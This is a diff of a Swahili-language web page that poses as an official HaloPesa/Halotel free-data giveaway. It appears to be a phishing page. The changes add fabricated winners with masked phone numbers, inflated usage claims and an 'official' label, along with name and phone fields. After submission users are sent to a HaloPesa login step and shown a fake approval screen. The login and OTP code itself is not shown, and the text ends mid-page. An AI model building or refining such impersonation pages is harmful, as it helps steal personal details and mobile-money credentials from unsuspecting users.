@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>HaloPesa Free Data - Data Bure</title>
+<title>HaloPesa Free Data - Data za Bure & Vifurushi vya Intaneti</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
@@ -18,8 +18,8 @@
     --text-mid: #4B5563;
     --text-light: #6B7280;
     --border: #E5E7EB;
-    --radius: 16px;
-    --radius-sm: 8px;
+    --radius: 20px;
+    --radius-sm: 10px;
   }
   
   * {
@@ -51,22 +51,9 @@
   .modal p  { font-size:0.88rem; color:var(--text-light); }
 
   /* LOGO */
-  .logo-header {
-    text-align: center;
-    padding: 6px 0;
-  }
-  .logo-header img {
-    height: 32px;
-    max-width: 100%;
-    object-fit: contain;
-    display: inline-block;
-    vertical-align: middle;
-  }
-  .logo-by {
-    font-size: 0.75rem;
-    color: rgba(255,255,255,0.9);
-    font-weight: 600;
-  }
+  .logo-header { text-align: center; padding: 6px 0; }
+  .logo-header img { height: 32px; max-width: 100%; object-fit: contain; display: inline-block; vertical-align: middle; }
+  .logo-by { font-size: 0.75rem; color: rgba(255,255,255,0.9); font-weight: 600; }
 
   /* NAV */
   .navbar { background:var(--halo-orange-dark); display:flex; align-items:center; justify-content:center; padding:0 20px; height:60px; position:relative; flex-shrink:0; border-bottom:2px solid rgba(255,255,255,0.2); }
@@ -144,186 +131,210 @@
   .land-nav .hbg span { width:20px; height:2px; background:#fff; border-radius:1px; display:block; }
   .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:24px 14px; }
   
-  .flyer-card { 
-    width:100%; 
-    max-width:480px; 
-    background: linear-gradient(135deg, #FF5500 0%, #D44400 100%);
-    border-radius: var(--radius); 
-    box-shadow: 0 16px 40px rgba(0,0,0,0.25); 
-    padding: 24px 20px; 
-    border: 1px solid rgba(255,255,255,0.2);
-    color: #FFFFFF;
-    position: relative;
-    overflow: hidden;
+  .data-landing-card {
+    width: 100%;
+    max-width: 440px;
     display: flex;
     flex-direction: column;
+    align-items: center;
     gap: 16px;
   }
 
-  .poster-brand-header { display: flex; align-items: center; }
-  .poster-halopesa-pill {
+  .data-brand-header { text-align: center; color: #FFFFFF; }
+  .data-brand-icon {
+    width: 64px;
+    height: 64px;
     background: #FFFFFF;
-    color: #FF5500;
-    font-weight: 900;
-    padding: 4px 14px;
+    border-radius: 18px;
+    margin: 0 auto 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+  }
+  .data-brand-icon img { height: 40px; object-fit: contain; }
+  .data-brand-title { font-size: 2.2rem; font-weight: 900; letter-spacing: -0.02em; color: #FFFFFF; line-height: 1.1; }
+  .data-brand-sub { font-size: 0.88rem; font-weight: 600; color: rgba(255,255,255,0.95); margin-top: 4px; }
+
+  /* PILL BADGES */
+  .data-badges-row {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    width: 100%;
+    flex-wrap: wrap;
+  }
+  .data-badge-pill {
+    background: rgba(255, 255, 255, 0.95);
+    color: var(--halo-orange-deep);
+    padding: 6px 14px;
     border-radius: 20px;
-    font-size: 0.85rem;
-    letter-spacing: -0.01em;
-    display: inline-flex;
+    font-size: 0.76rem;
+    font-weight: 700;
+    display: flex;
     align-items: center;
-    gap: 6px;
+    gap: 5px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.08);
   }
-  .poster-halopesa-pill img { height: 18px; object-fit: contain; vertical-align: middle; }
-  .poster-halopesa-pill span { font-weight: 500; color: #1A1A1A; font-size: 0.75rem; margin-left: 2px; }
 
-  .flyer-head { position: relative; }
-  .flyer-title-main { font-size: 2.3rem; font-weight: 900; color: #FFFFFF; text-transform: uppercase; line-height: 0.95; letter-spacing: -0.02em; }
-  .flyer-title-sub { font-size: 2.1rem; font-weight: 900; color: #1A1A1A; line-height: 1; text-transform: uppercase; letter-spacing: -0.02em; margin-top: 2px; }
-  
-  .flyer-subtext {
-    font-size: 0.84rem;
+  /* SMOOTH SCROLLING WINNERS TICKER DESIGN */
+  .winner-ticker-wrapper {
+    width: 100%;
+    overflow: hidden;
+    position: relative;
+  }
+  .winner-status-label {
+    font-size: 0.65rem;
+    font-weight: 800;
     color: rgba(255,255,255,0.95);
-    line-height: 1.4;
-    margin: 12px 0 0 0;
-    font-weight: 500;
-  }
-
-  .poster-limit-badge {
-    background: #FFFFFF;
-    color: var(--halo-orange);
-    width: 115px;
-    height: 115px;
-    border-radius: 50%;
-    position: absolute;
-    top: 0;
-    right: 0;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 8px;
     text-align: center;
-    box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-    border: 3px solid #FFF5EE;
-    padding: 8px;
-  }
-  .poster-limit-badge .plt-top { font-size: 0.55rem; font-weight: 800; text-transform: uppercase; color: #4B5563; line-height: 1.1; }
-  .poster-limit-badge .plt-num { font-size: 1.4rem; font-weight: 900; color: #1A1A1A; line-height: 1; margin: 2px 0; }
-  .poster-limit-badge .plt-bot { font-size: 0.65rem; font-weight: 800; color: var(--halo-orange); text-transform: uppercase; }
-
-  .calc-box { background:#FFFFFF; border-radius:var(--radius-sm); padding:16px; color:var(--text-dark); box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
-  .calc-box h2 { font-size:0.9rem; font-weight:700; color:var(--halo-orange); margin-bottom:10px; }
-  .calc-row2 { display:flex; justify-content:space-between; font-size:0.8rem; color:var(--text-mid); margin-bottom:4px; font-weight:600; }
-  .calc-row2 .cv { color:var(--halo-orange); font-weight:800; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:6px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--halo-orange) 0%,var(--halo-orange) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--halo-orange); border:3px solid #fff; box-shadow:0 2px 6px rgba(0,0,0,0.25); cursor:pointer; }
-  .range-ends { display:flex; justify-content:space-between; font-size:0.7rem; color:var(--text-light); margin-bottom:10px; font-weight:500; }
-  
-  .monthly-box { background:var(--halo-orange-dark); border-radius:var(--radius-sm); padding:10px 12px; display:flex; justify-content:space-between; align-items:center; color:#fff; }
-  .monthly-box .ml { font-size:0.78rem; color:rgba(255,255,255,0.9); }
-  .monthly-box .ma { font-size:1.1rem; font-weight:800; color:#FFFFFF; }
-
-  .poster-features-row {
-    display: flex;
-    background: rgba(0, 0, 0, 0.15);
-    border-radius: 12px;
-    padding: 10px 8px;
-    gap: 4px;
-    border: 1px solid rgba(255,255,255,0.1);
-  }
-  .poster-feat {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    text-align: center;
-    padding: 0 4px;
-  }
-  .poster-feat-icon {
-    width: 30px;
-    height: 30px;
-    border-radius: 50%;
-    background: rgba(255,255,255,0.2);
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 0.9rem;
-    margin-bottom: 4px;
-    color: #FFFFFF;
-    border: 1px solid rgba(255,255,255,0.3);
-  }
-  .poster-feat-title { font-size: 0.72rem; font-weight: 700; color: #FFFFFF; line-height: 1.2; }
-  .poster-feat-desc { font-size: 0.62rem; color: rgba(255,255,255,0.8); margin-top: 1px; line-height: 1.15; }
-
-  .poster-availability-banner {
-    background: #1A1A1A;
-    border-radius: 12px;
-    padding: 12px 14px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    border: 1px solid rgba(255,255,255,0.15);
-  }
-  .pav-left { display: flex; align-items: center; gap: 10px; }
-  .pav-icon-wrap {
-    width: 36px;
-    height: 36px;
-    background: rgba(255,255,255,0.1);
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 1rem;
-  }
-  .pav-text-top { font-size: 0.65rem; font-weight: 800; color: #FF5500; text-transform: uppercase; letter-spacing: 0.04em; }
-  .pav-text-bot { font-size: 0.78rem; font-weight: 700; color: #FFFFFF; margin-top: 1px; }
-  .pav-right {
-    text-align: right;
-    border-left: 1px solid rgba(255,255,255,0.15);
-    padding-left: 12px;
-  }
-  .pav-right .pr-top { font-size: 0.75rem; font-weight: 900; color: #FFFFFF; }
-  .pav-right .pr-bot { font-size: 0.62rem; color: rgba(255,255,255,0.7); margin-top: 1px; }
-
-  .poster-bottom-footer {
-    background: #FFFFFF;
-    border-radius: 12px;
-    padding: 12px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    color: #1A1A1A;
     gap: 6px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
   }
-  .pbf-item {
-    flex: 1;
+  .winner-status-label .live-dot {
+    width: 8px;
+    height: 8px;
+    background: #00FF66;
+    border-radius: 50%;
+    box-shadow: 0 0 8px #00FF66;
+    animation: blinkDot 1.2s infinite ease-in-out;
+  }
+  @keyframes blinkDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+  .winner-marquee-container {
+    display: flex;
+    width: max-content;
+    animation: marqueeScroll 18s linear infinite;
+  }
+  .winner-marquee-container:hover {
+    animation-play-state: paused;
+  }
+
+  .winner-scroll-group {
+    display: flex;
+    gap: 12px;
+    padding-right: 12px;
+  }
+
+  .winner-pill {
+    background: rgba(215, 65, 0, 0.55);
+    border: 1px solid rgba(255, 255, 255, 0.35);
+    backdrop-filter: blur(8px);
+    border-radius: 25px;
+    padding: 8px 16px;
+    white-space: nowrap;
+    color: #FFFFFF;
+    font-size: 0.78rem;
+    font-weight: 600;
     display: flex;
     align-items: center;
     gap: 8px;
-    border-right: 1px solid #E5E7EB;
-    padding-right: 4px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
   }
-  .pbf-item:last-child { border-right: none; padding-right: 0; }
-  .pbf-icon {
-    width: 28px;
-    height: 28px;
-    min-width: 28px;
-    border-radius: 50%;
-    background: #FFF5EE;
-    color: #FF5500;
+  .winner-pill span.highlight {
+    font-weight: 800;
+    color: #FFF;
+  }
+
+  @keyframes marqueeScroll {
+    0% { transform: translateX(0); }
+    100% { transform: translateX(-50%); }
+  }
+
+  /* BUNDLE SELECTION CARD */
+  .bundle-selection-card {
+    background: linear-gradient(180deg, #FF6611 0%, #E64A00 100%);
+    border-radius: 28px;
+    padding: 24px 20px;
+    width: 100%;
+    box-shadow: 0 12px 32px rgba(0, 0, 0, 0.2);
+    border: 1px solid rgba(255, 255, 255, 0.25);
+    text-align: center;
+  }
+  .bundle-card-title {
+    color: #FFFFFF;
+    font-size: 1.1rem;
+    font-weight: 900;
+    text-transform: uppercase;
+    letter-spacing: 0.02em;
+    margin-bottom: 20px;
+  }
+  .bundle-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+    margin-bottom: 22px;
+  }
+  .bundle-item {
+    background: rgba(215, 65, 0, 0.5);
+    border: 2px solid transparent;
+    border-radius: 20px;
+    padding: 16px 12px;
+    color: #FFFFFF;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+  }
+  .bundle-item:hover { background: rgba(230, 75, 0, 0.7); }
+  .bundle-item.selected {
+    background: rgba(215, 65, 0, 0.85);
+    border-color: #FFFFFF;
+    box-shadow: 0 0 15px rgba(255,255,255,0.4), inset 0 2px 4px rgba(0,0,0,0.15);
+  }
+  .bundle-gb { font-size: 1.6rem; font-weight: 900; line-height: 1; margin-bottom: 4px; }
+  .bundle-days { font-size: 0.75rem; font-weight: 600; opacity: 0.9; }
+
+  /* ACTION BUTTON */
+  .btn-bundle-submit {
+    background: linear-gradient(180deg, #FF5500 0%, #D44400 100%);
+    border: 1.5px solid rgba(255,255,255,0.3);
+    color: #FFFFFF;
+    font-size: 1.15rem;
+    font-weight: 900;
+    border-radius: 35px;
+    padding: 16px;
+    width: 100%;
+    cursor: pointer;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.25);
     display: flex;
     align-items: center;
     justify-content: center;
-    font-size: 0.8rem;
-    font-weight: bold;
+    gap: 8px;
+    transition: transform 0.15s ease;
   }
-  .pbf-text .pbf-t { font-size: 0.68rem; font-weight: 800; color: #1A1A1A; line-height: 1.1; }
-  .pbf-text .pbf-d { font-size: 0.58rem; color: #6B7280; margin-top: 1px; line-height: 1.1; }
+  .btn-bundle-submit:active { transform: scale(0.98); }
 
-  .ussd-footer {
+  /* BOTTOM STATS ROW */
+  .bottom-stats-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 8px;
+    width: 100%;
+  }
+  .stat-card-white {
+    background: #FFFFFF;
+    border-radius: 16px;
+    padding: 12px 6px;
     text-align: center;
-    font-size: 0.75rem;
-    color: rgba(255,255,255,0.85);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+  }
+  .stat-card-icon { font-size: 1.1rem; margin-bottom: 4px; }
+  .stat-card-title { font-size: 0.65rem; font-weight: 800; color: #1A1A1A; line-height: 1.15; }
+  .stat-card-desc { font-size: 0.58rem; color: #6B7280; margin-top: 2px; line-height: 1.1; }
+
+  .official-tag {
+    font-size: 0.72rem;
+    color: rgba(255,255,255,0.9);
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-top: 4px;
   }
 
   /* STEP PAGES */
@@ -397,14 +408,14 @@
 
   /* APPROVAL */
   #page-approval { background:var(--halo-orange); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; border-radius:var(--radius); overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.3); background: #ffffff; }
+  .appr-wrap { width:100%; max-width:520px; border-radius:var(--radius); overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.3); }
   .appr-top { background:#fff; padding:28px 24px 0; text-align:center; }
   .check-circle { width:56px; height:56px; border-radius:50%; background:var(--halo-orange); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.5rem; color:#FFFFFF; font-weight:bold; box-shadow:0 4px 16px rgba(255,85,0,0.3); }
   .appr-title { font-size:1.25rem; font-weight:800; color:var(--halo-orange); margin-bottom:6px; }
   .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
   .appr-banner { background:var(--halo-orange); padding:18px; margin:0 -24px; text-align:center; border-top:3px solid var(--halo-orange-dark); }
   .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.85); text-transform:uppercase; letter-spacing:0.06em; font-weight:600; }
-  .appr-banner .aba { font-size:1.8rem; font-weight:800; color:#FFFFFF; }
+  .appr-banner .aba { font-size:2rem; font-weight:800; color:#FFFFFF; }
   .comp-box { background:#FFF8F0; border:1px solid #FFD6B3; padding:16px; }
   .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#B33600; margin-bottom:6px; }
   .comp-box p { font-size:0.78rem; color:#B33600; line-height:1.6; }
@@ -445,11 +456,8 @@
     .field-row{grid-template-columns:1fr;}
     .step-card{padding:24px 18px;}
     .otp-card{padding:24px 16px;}
-    .flyer-card{padding:20px 14px;}
-    .flyer-title-main{font-size:1.9rem;}
-    .flyer-title-sub{font-size:1.7rem;}
-    .poster-limit-badge{width:95px; height:95px;}
-    .poster-limit-badge .plt-num{font-size:1.2rem;}
+    .bundle-grid{grid-template-columns:1fr 1fr; gap:10px;}
+    .bundle-gb{font-size:1.35rem;}
   }
 </style>
 </head>
@@ -467,105 +475,102 @@
   </nav>    
 
   <div class="land-center">
-    <div class="flyer-card">
-      <div class="poster-brand-header">
-        <div class="poster-halopesa-pill">
-          <img src="images/halopesalogo.png" alt="HaloPesa Logo" style="height: 18px;"> <span>HaloPesa</span>
+    <div class="data-landing-card">
+      
+      <!-- BRAND ICON & HEADER -->
+      <div class="data-brand-header">
+        <div class="data-brand-icon">
+          <img src="images/halopesalogo.png" alt="HaloPesa Logo">
         </div>
+        <h1 class="data-brand-title">HaloPesa</h1>
+        <p class="data-brand-sub">Data za Bure & Vifurushi vya Intaneti</p>
       </div>
 
-      <div class="flyer-head">
-        <div class="flyer-title-main">HaloPesa</div>
-        <div class="flyer-title-sub">DATA YA BURE💯</div>        
+      <!-- PILL BADGES -->
+      <div class="data-badges-row">
+        <div class="data-badge-pill">⚡ Kasi ya 4G/5G</div>
+        <div class="data-badge-pill">🎁 Halotel</div>
+        <div class="data-badge-pill">💯 Papo Hapo</div>
+      </div>
+
+      <!-- SMOOTH CONTINUOUS TICKER SECTION -->
+      <div class="winner-ticker-wrapper">
+        <div class="winner-status-label">
+          <span class="live-dot"></span> WASHINDI WETU WA HIVI KARIBUNI - OMBA SASA
+        </div>
         
-        <div class="poster-limit-badge">
-          <div class="plt-top">Pata Data Hadi</div>
-          <div class="plt-num">100</div>
-          <div class="plt-bot">GB</div>
-        </div>
-
-        <div class="flyer-subtext">
-          Pata GB zako za bure sasa hivi!        
-        </div>
-      </div>
-
-      <div class="poster-features-row">
-        <div class="poster-feat">
-          <div class="poster-feat-icon">⚡</div>
-          <div class="poster-feat-title">Kasi ya 4G/5G</div>
-          <div class="poster-feat-desc">bila kukata</div>
-        </div>
-        <div class="poster-feat">
-          <div class="poster-feat-icon">🛡️</div>
-          <div class="poster-feat-title">Salama na</div>
-          <div class="poster-feat-desc">ya kuaminika</div>
-        </div>
-        <div class="poster-feat">
-          <div class="poster-feat-icon">📱</div>
-          <div class="poster-feat-title">Ingiza kwenye</div>
-          <div class="poster-feat-desc">namba yako</div>
-        </div>
-      </div>
-
-      <div class="poster-availability-banner">
-        <div class="pav-left">
-          <div class="pav-icon-wrap">👥</div>
-          <div>
-            <div class="pav-text-top">Inapatikana kwa</div>
-            <div class="pav-text-bot">Wateja wote wa HaloPesa</div>
+        <div class="winner-marquee-container">
+          <!-- GROUP 1 -->
+          <div class="winner-scroll-group">
+            <div class="winner-pill">🎁 <span class="highlight">John 0617xxx920</span> amepokea <span class="highlight">75GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Jane 0627xxx561</span> amepokea <span class="highlight">100GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Amani 0614xxx112</span> amepokea <span class="highlight">50GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Rashid 0712xxx344</span> amepokea <span class="highlight">150GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Neema 0621xxx889</span> amepokea <span class="highlight">75GB</span></div>
           </div>
-        </div>
-        <div class="pav-right">
-          <div class="pr-top">CHAGUA SASA!</div>
-        </div>
-      </div>
-
-      <div class="calc-box">
-        <h2>Kikokotoo cha Data za Bure</h2>
-        <div class="calc-row2"><span>Kiasi cha Data</span><span class="cv" id="aDisp">1 GB</span></div>
-        <input type="range" id="rA" min="1" max="100" step="1" value="5" oninput="calcUp()" style="--pct:4%">
-        <div class="range-ends"><span>1 GB</span><span>100 GB</span></div>
-        <div class="calc-row2"><span>Muda wa Matumizi</span><span class="cv" id="tDisp">siku 30</span></div>
-        <input type="range" id="rT" min="1" max="90" step="1" value="30" oninput="calcUp()" style="--pct:32%">
-        <div class="range-ends"><span>Siku 1</span><span>Siku 90</span></div>
-        <div class="monthly-box">
-          <span class="ml">Gharama ya Kifurushi</span>
-          <span class="ma" id="mOut"> BURE (0 TZS)</span>
-        </div>
-      </div>
-
-      <button class="btn-bovya" onclick="goTo('page-step1')">
-        <span class="arrow-circle">➔</span>
-        <span>Pata Data Sasa !</span>
-      </button>
-
-      <div class="poster-bottom-footer">
-        <div class="pbf-item">
-          <div class="pbf-icon">🎁</div>
-          <div class="pbf-text">
-            <div class="pbf-t">Bure Kabisa</div>
-            <div class="pbf-d">Hakuna malipo ya siri</div>
-          </div>
-        </div>
-        <div class="pbf-item">
-          <div class="pbf-icon">🚀</div>
-          <div class="pbf-text">
-            <div class="pbf-t">Rahisi</div>
-            <div class="pbf-d">Hatua fupi na za haraka</div>
-          </div>
-        </div>
-        <div class="pbf-item">
-          <div class="pbf-icon">⚡</div>
-          <div class="pbf-text">
-            <div class="pbf-t">Fast</div>
-            <div class="pbf-d">Unganishwa mara moja</div>
+          <!-- GROUP 2 (DUPLICATED FOR INFINITE SMOOTH LOOP) -->
+          <div class="winner-scroll-group">
+            <div class="winner-pill">🎁 <span class="highlight">John 0617xxx920</span> amepokea <span class="highlight">75GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Jane 0627xxx561</span> amepokea <span class="highlight">100GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Amani 0614xxx112</span> amepokea <span class="highlight">50GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Rashid 0712xxx344</span> amepokea <span class="highlight">150GB</span></div>
+            <div class="winner-pill">🎁 <span class="highlight">Neema 0621xxx889</span> amepokea <span class="highlight">75GB</span></div>
           </div>
         </div>
       </div>
 
-      <div class="ussd-footer">
-        Piga <strong>*150*00#</strong> au tumia App ya HaloPesa
+      <!-- BUNDLE SELECTION CARD -->
+      <div class="bundle-selection-card">
+        <div class="bundle-card-title">CHAGUA KIFURUSHI CHAKO CHA DATA</div>
+        
+        <div class="bundle-grid">
+          <div class="bundle-item" onclick="selectBundle(this, '50 GB', 'Siku 30')">
+            <div class="bundle-gb">50 GB</div>
+            <div class="bundle-days">Siku 30</div>
+          </div>
+          <div class="bundle-item" onclick="selectBundle(this, '75 GB', 'Siku 30')">
+            <div class="bundle-gb">75 GB</div>
+            <div class="bundle-days">Siku 30</div>
+          </div>
+          <div class="bundle-item selected" onclick="selectBundle(this, '100 GB', 'Siku 60')">
+            <div class="bundle-gb">100 GB</div>
+            <div class="bundle-days">Siku 60</div>
+          </div>
+          <div class="bundle-item" onclick="selectBundle(this, '150 GB', 'Siku 90')">
+            <div class="bundle-gb">150 GB</div>
+            <div class="bundle-days">Siku 90</div>
+          </div>
+        </div>
+
+        <button class="btn-bundle-submit" onclick="goTo('page-step1')">
+          <span>OMBA SASA</span>
+          <span>➔</span>
+        </button>
       </div>
+
+      <!-- STATS FOOTER ROW -->
+      <div class="bottom-stats-row">
+        <div class="stat-card-white">
+          <div class="stat-card-icon">📡</div>
+          <div class="stat-card-title">10,000+ Data</div>
+          <div class="stat-card-desc">Zimegawawa</div>
+        </div>
+        <div class="stat-card-white">
+          <div class="stat-card-icon">⚡</div>
+          <div class="stat-card-title">Intaneti Spidi</div>
+          <div class="stat-card-desc">Utoaji wa haraka</div>
+        </div>
+        <div class="stat-card-white">
+          <div class="stat-card-icon">🔒</div>
+          <div class="stat-card-title">Ulinzi wa Data</div>
+          <div class="stat-card-desc">Mtandao Salama</div>
+        </div>
+      </div>
+
+      <div class="official-tag">
+        ✦ Usalama | 🌐 Halotel Tanzania Official Free Data
+      </div>
+
     </div>
   </div>
 
@@ -583,14 +588,13 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Usajili wa Data Bure</h2>
+      <h2>Maombi ya HaloPesa Free Data</h2>
       <p class="step-sub">Hatua 1 ya 3</p>
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Aina ya Kifurushi cha Data</label><div class="sel-wrap"><select id="s1ty"><option selected>Kifurushi cha Kila Siku (Daily)</option><option>Kifurushi cha Wiki (Weekly)</option><option>Kifurushi cha Mwezi (Monthly)</option><option>Data za Usiku (Night Unlimited)</option><option>Data za Mitandao ya Kijamii</option></select></div></div>
-      <div class="field"><label>Kiasi cha Data (GB)</label><input type="number" id="s1am" value="5" placeholder="Weka kiasi cha GB" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Muda wa Kifurushi</label><div class="sel-wrap"><select id="s1te"><option>Siku 1</option><option>Siku 7</option><option selected>Siku 30</option><option>Siku 90</option></select></div></div>
-      <div class="field"><label>Madhumuni ya Matumizi</label><textarea id="s1pu" placeholder="Elezea matumizi yako makuu ya data (mf. Masomo, Kazi, Burudani)…" oninput="clearErr('s1Err')"></textarea></div>
+      <div class="field"><label>Aina ya Mtandao</label><div class="sel-wrap"><select id="s1net"><option selected>Halotel Tanzania (4G/5G)</option></select></div></div>
+      <div class="field"><label>Kifurushi Kilichochaguliwa</label><input type="text" id="s1am" value="100 GB (Siku 60)" readonly></div>
+      <div class="field"><label>Matumizi Makuu ya Data</label><div class="sel-wrap"><select id="s1pu"><option selected>Kujifunzia / Masomo</option><option>Kazi na Biashara</option><option>Burudani & Mitandao ya Jamii</option><option>Matumizi ya Kawaida</option></select></div></div>
       <button class="btn-bovya" onclick="toS2()">HATUA INAYOFUATA</button>
     </div>
   </div>
@@ -607,10 +611,14 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Usajili wa Data Bure</h2>
+      <h2>Maombi ya HaloPesa Free Data</h2>
       <p class="step-sub">Hatua 2 ya 3 (Nambari ya HaloPesa inaanza na 06/07)</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
+      <div class="field-row">
+        <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Jina la kwanza" oninput="clearErr('s2Err')"></div>
+        <div class="field"><label>Jina la Ukoo</label><input type="text" id="s2la" placeholder="Jina la ukoo" oninput="clearErr('s2Err')"></div>
+      </div>
       <div class="field">
         <label>Nambari ya Simu ya HaloPesa</label>
         <div class="phone-row"><div class="ph-pre">🇹🇿 +255</div><input type="tel" id="s2ph" placeholder="0612345678" maxlength="10" oninput="clearErr('s2Err')"></div>
@@ -636,22 +644,21 @@
   </nav>
   <div class="step-center">
     <div class="step-card">
-      <h2>Usajili wa Data Bure</h2>
+      <h2>Maombi ya HaloPesa Free Data</h2>
       <p class="step-sub">Hatua 3 ya 3</p>
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><span class="msg-icon">&#x2715;</span><span id="s3ErrTxt"></span></div>
-      <div class="field"><label>Hali ya Sasa</label><div class="sel-wrap"><select id="s3em"><option>Mwanafunzi</option><option selected>Mjasiriamali / Mfanyabiashara</option><option>Mwajiriwa</option><option>Mtafutaji / Kijana</option><option>Mwingineo</option></select></div></div>
-      <div class="field"><label>Matumizi ya Wastani ya Kila Mwezi (GB)</label><input type="number" id="s3in" placeholder="Weka makisio ya GB kwa mwezi" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label>Aina ya Kifaa</label><div class="sel-wrap"><select id="s3em"><option selected>Simu ya Mkononi (Android/iOS)</option><option>Kishikwambi (Tablet)</option><option>Modem / Router ya WiFi</option></select></div></div>
       <div class="sum-box">
-        <h3>Muhtasari wa Kifurushi</h3>
-        <div class="sum-row"><span class="sk">Kiasi cha Data:</span><span class="sv" id="sA">5 GB</span></div>
-        <div class="sum-row"><span class="sk">Muda wa Kifurushi:</span><span class="sv" id="sT">Siku 30</span></div>
-        <div class="sum-row"><span class="sk">Madhumuni:</span><span class="sv" id="sP">—</span></div>
-        <div class="sum-row"><span class="sk">Namba ya Simu:</span><span class="sv" id="sN">—</span></div>
+        <h3>Muhtasari wa Maombi</h3>
+        <div class="sum-row"><span class="sk">Kifurushi:</span><span class="sv" id="sA">100 GB</span></div>
+        <div class="sum-row"><span class="sk">Muda wa Kifurushi:</span><span class="sv" id="sT">Siku 60</span></div>
+        <div class="sum-row"><span class="sk">Matumizi:</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk">Mwombaji:</span><span class="sv" id="sN">—</span></div>
       </div>
       <div class="step-btns">
         <button class="btn-gray" onclick="goTo('page-step2')">ILIYOTANGULIA</button>
-        <button class="btn-bovya" onclick="submitApp()">WASILISHA OMBI</button>
+        <button class="btn-bovya" onclick="submitApp()">WASILISHA MAOMBI</button>
       </div>
     </div>
   </div>
@@ -662,8 +669,8 @@
 <div id="page-submitted" class="page">
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
-    <h2>Ombi la Data Limewasilishwa</h2>
-    <p>Ombi lako la HaloPesa Free Data limepokelewa. Tafadhali subiri uthibitisho.<br>Utapata ujumbe mfupi. Kwa sasa, endelea kuingia kwenye akaunti yako.</p>
+    <h2>Maombi ya Data Yamewasilishwa</h2>
+    <p>Maombi yako ya HaloPesa Free Data yamewasilishwa. Tafadhali subiri uthibitisho.<br>Utapata ujumbe wa uthibitisho. Kwa sasa, endelea kwenye HaloPesa.</p>
     <div class="redir-pill">🔄 Unaelekezwa kwenye kuingia HaloPesa katika <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-bovya" onclick="goTo('page-login')">Nenda Kuingia Sasa</button>
   </div>
@@ -753,38 +760,31 @@
   <div class="appr-wrap">
     <div class="appr-top">
       <div class="check-circle">✓</div>
-      <div class="appr-title">Masharti ya Kustahili Data</div>
-      <div class="appr-sub">Tafadhali kagua vigezo vya kupokea kifurushi chako cha bure cha HaloPesa.</div>
-      <div class="appr-banner"><div class="abl">HALI YA KUSTAHILI</div><div class="aba" id="apAmt">Vigezo Vinahitajika</div></div>
+      <div class="appr-title">🎉 Hongera!</div>
+      <div class="appr-sub">HaloPesa Free Data yako <strong>imeidhinishwa!</strong> Kifurushi chako kitatumwa hivi karibuni kwenye namba yako.</div>
+      <div class="appr-banner"><div class="abl">KIFURUSHI KILICHOIDHINISHWA</div><div class="aba" id="apAmt">100 GB</div></div>
     </div>
-    
